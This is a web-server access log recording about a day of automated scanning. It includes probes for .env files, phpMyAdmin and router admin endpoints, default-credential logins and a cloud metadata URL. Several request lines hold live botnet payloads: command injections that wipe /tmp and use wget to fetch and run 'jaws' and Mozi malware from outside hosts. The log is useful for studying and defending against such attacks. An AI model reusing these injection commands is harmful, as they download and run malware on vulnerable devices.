149.5.173.16 - - [06/Sep/2022:15:54:17 +0000] "GET /muieblackcat HTTP/1.1" 404 196 "-" "-"
149.5.173.16 - - [06/Sep/2022:15:54:17 +0000] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 196 "-" "-"
149.5.173.16 - - [06/Sep/2022:15:54:17 +0000] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 196 "-" "-"
149.5.173.16 - - [06/Sep/2022:15:54:18 +0000] "GET //pma/scripts/setup.php HTTP/1.1" 404 196 "-" "-"
149.5.173.16 - - [06/Sep/2022:15:54:18 +0000] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 196 "-" "-"
149.5.173.16 - - [06/Sep/2022:15:54:18 +0000] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 196 "-" "-"
2.57.122.98 - - [06/Sep/2022:16:21:30 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
58.44.214.164 - - [06/Sep/2022:16:25:47 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 196 "-" "Hello, World"
20.39.248.65 - - [06/Sep/2022:16:42:45 +0000] "HEAD /robots.txt HTTP/1.0" 404 - "-" "-"
185.254.196.115 - - [06/Sep/2022:16:49:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:16:49:23 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.248.133.46 - - [06/Sep/2022:17:13:57 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
167.248.133.46 - - [06/Sep/2022:17:13:57 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.46 - - [06/Sep/2022:17:13:57 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
135.125.246.189 - - [06/Sep/2022:17:17:18 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:17:17:19 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:17:54:41 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:17:54:41 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.49.58.9 - - [06/Sep/2022:18:12:32 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+networkmapping.xyz/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
185.254.196.115 - - [06/Sep/2022:18:17:41 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:18:17:42 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.133.58 - - [06/Sep/2022:18:22:36 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.13.169.45 - - [06/Sep/2022:18:44:36 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
51.13.169.45 - - [06/Sep/2022:18:44:37 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
197.34.42.228 - - [06/Sep/2022:19:02:47 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+botnet.psscc.cn/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
185.36.81.23 - - [06/Sep/2022:19:14:54 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
185.36.81.23 - - [06/Sep/2022:19:14:54 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
135.125.246.189 - - [06/Sep/2022:19:36:14 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:19:36:15 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [06/Sep/2022:19:40:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [06/Sep/2022:19:40:43 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:20:14:43 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:20:14:43 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.68.163.72 - - [06/Sep/2022:20:17:47 +0000] "GET /config.js HTTP/1.1" 404 196 "-" "python-requests/2.28.1"
20.68.163.72 - - [06/Sep/2022:20:17:47 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.68.163.72 - - [06/Sep/2022:20:17:47 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
20.68.163.72 - - [06/Sep/2022:20:17:47 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.68.163.72 - - [06/Sep/2022:20:17:47 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
125.47.64.68 - - [06/Sep/2022:20:35:04 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 196 "-" "-"
205.210.31.11 - - [06/Sep/2022:20:48:22 +0000] "GET / HTTP/1.1" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
180.149.125.164 - - [06/Sep/2022:21:02:22 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
5.160.128.251 - - [06/Sep/2022:21:17:19 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:21:49:34 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:21:49:34 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
116.62.111.9 - - [06/Sep/2022:21:57:39 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71"
59.95.31.212 - - [06/Sep/2022:22:04:15 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
128.14.209.162 - - [06/Sep/2022:22:33:44 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
167.94.145.58 - - [06/Sep/2022:22:58:09 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
167.94.145.58 - - [06/Sep/2022:22:58:09 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.58 - - [06/Sep/2022:22:58:10 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
135.125.246.189 - - [06/Sep/2022:23:34:32 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:23:34:32 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.42.192.114 - - [07/Sep/2022:00:00:13 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:00:06:03 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:00:06:03 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
115.192.247.141 - - [07/Sep/2022:00:46:45 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 196 "-" "-"
95.214.235.205 - - [07/Sep/2022:01:25:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:01:25:44 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:01:48:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:01:48:28 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.98 - - [07/Sep/2022:02:03:52 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
51.142.197.207 - - [07/Sep/2022:02:13:02 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
51.142.197.207 - - [07/Sep/2022:02:13:02 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
192.241.204.244 - - [07/Sep/2022:02:26:01 +0000] "MGLNDD_35.172.128.201_80\n" 400 226 "-" "-"
94.102.61.10 - - [07/Sep/2022:02:40:48 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
180.149.125.165 - - [07/Sep/2022:02:42:59 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:03:09:58 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:03:09:59 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:03:18:03 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:03:18:03 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.140.248.32 - - [07/Sep/2022:03:27:41 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
50.16.1.184 - - [07/Sep/2022:03:58:38 +0000] "GET /.env HTTP/1.1" 404 196 "-" "MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
50.16.1.184 - - [07/Sep/2022:03:58:38 +0000] "POST / HTTP/1.1" 200 32 "-" "MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
198.235.24.8 - - [07/Sep/2022:04:27:47 +0000] "\x16\x03\x01" 400 226 "-" "-"
135.125.246.189 - - [07/Sep/2022:04:43:00 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:04:43:00 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.220.101.175 - - [07/Sep/2022:04:59:12 +0000] "GET http://169.254.169.254/latest/meta-data/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:05:02:45 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [07/Sep/2022:05:02:46 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
120.85.116.130 - - [07/Sep/2022:05:22:57 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 196 "-" "Hello, World"
135.125.246.110 - - [07/Sep/2022:05:35:49 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:05:35:49 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
18.130.40.7 - - [07/Sep/2022:05:36:54 +0000] "GET / HTTP/1.0" 200 32 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.130.40.7 - - [07/Sep/2022:05:45:06 +0000] "GET / HTTP/1.0" 200 32 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.130.40.7 - - [07/Sep/2022:05:53:16 +0000] "GET / HTTP/1.0" 200 32 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
192.241.206.204 - - [07/Sep/2022:05:54:07 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
95.214.235.205 - - [07/Sep/2022:06:01:12 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:06:01:13 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
18.130.40.7 - - [07/Sep/2022:06:01:28 +0000] "GET / HTTP/1.0" 200 32 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.130.40.7 - - [07/Sep/2022:06:09:39 +0000] "GET / HTTP/1.0" 200 32 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
156.200.235.89 - - [07/Sep/2022:06:15:59 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+botnet.psscc.cn/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
18.130.40.7 - - [07/Sep/2022:06:17:53 +0000] "\x16\x03\x01" 400 226 "-" "-"
18.130.40.7 - - [07/Sep/2022:06:17:55 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.130.40.7 - - [07/Sep/2022:06:17:57 +0000] "\x16\x03\x01" 400 226 "-" "-"
18.130.40.7 - - [07/Sep/2022:06:18:00 +0000] "GET /manage/account/login HTTP/1.1" 404 196 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.130.40.7 - - [07/Sep/2022:06:18:02 +0000] "\x16\x03\x01" 400 226 "-" "-"
18.130.40.7 - - [07/Sep/2022:06:18:04 +0000] "GET /admin/index.html HTTP/1.1" 404 196 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.130.40.7 - - [07/Sep/2022:06:18:06 +0000] "\x16\x03\x01" 400 226 "-" "-"
18.130.40.7 - - [07/Sep/2022:06:18:08 +0000] "GET /index.html HTTP/1.1" 200 32 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
18.130.40.7 - - [07/Sep/2022:06:18:10 +0000] "\x16\x03\x01" 400 226 "-" "-"
18.130.40.7 - - [07/Sep/2022:06:18:12 +0000] "GET / HTTP/1.1" 200 32 "-" "'Cloud mapping experiment. Contact research@pdrlabs.net'"
205.210.31.43 - - [07/Sep/2022:06:19:59 +0000] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.13 - - [07/Sep/2022:07:03:09 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.246.110 - - [07/Sep/2022:07:51:43 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:07:51:43 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.47.218.118 - - [07/Sep/2022:08:32:20 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:08:50:38 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:08:50:38 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.128.152.119 - - [07/Sep/2022:08:59:04 +0000] "GET / HTTP/1.0" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
23.251.102.74 - - [07/Sep/2022:09:26:16 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:09:27:17 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:09:27:17 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.242.173 - - [07/Sep/2022:09:44:08 +0000] "\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<\xe0\x13\xcf" 400 226 "-" "-"
135.125.246.110 - - [07/Sep/2022:10:14:17 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:10:14:17 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:10:40:22 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:10:40:23 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:11:06:35 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:11:06:36 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
5.181.80.37 - - [07/Sep/2022:11:37:21 +0000] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 196 "-" "-"
223.71.167.166 - - [07/Sep/2022:11:50:32 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
95.214.235.205 - - [07/Sep/2022:12:06:47 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:12:06:47 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
223.130.31.29 - - [07/Sep/2022:12:21:10 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.130.31.29:36887/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 196 "-" "-"
165.22.220.2 - - [07/Sep/2022:12:43:28 +0000] "f<\xa9\xa4'\x19\xdaq\n" 400 226 "-" "-"
165.22.220.2 - - [07/Sep/2022:12:43:29 +0000] "\x16\x03\x01" 400 226 "-" "-"
165.22.220.2 - - [07/Sep/2022:12:43:29 +0000] "\x16\x03\x01" 400 226 "-" "-"
165.22.220.2 - - [07/Sep/2022:12:43:29 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
95.161.131.237 - - [07/Sep/2022:12:49:20 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
95.161.131.237 - - [07/Sep/2022:12:55:14 +0000] "GET / HTTP/1.1" 200 32 "-" "Linux Gnu (cow)"
135.125.246.110 - - [07/Sep/2022:13:00:06 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:13:00:06 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.248.133.60 - - [07/Sep/2022:13:09:34 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
167.248.133.60 - - [07/Sep/2022:13:09:34 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.60 - - [07/Sep/2022:13:09:34 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
95.32.81.108 - - [07/Sep/2022:14:01:51 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 196 "-" "-"
135.125.246.110 - - [07/Sep/2022:14:33:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:14:33:29 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:15:04:20 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:15:04:20 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
180.149.125.171 - - [07/Sep/2022:15:26:08 +0000] "GET /c/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
124.89.86.136 - - [07/Sep/2022:16:12:27 +0000] "GET / HTTP/1.1" 400 226 "-" "-"
124.253.144.41 - - [07/Sep/2022:16:19:08 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
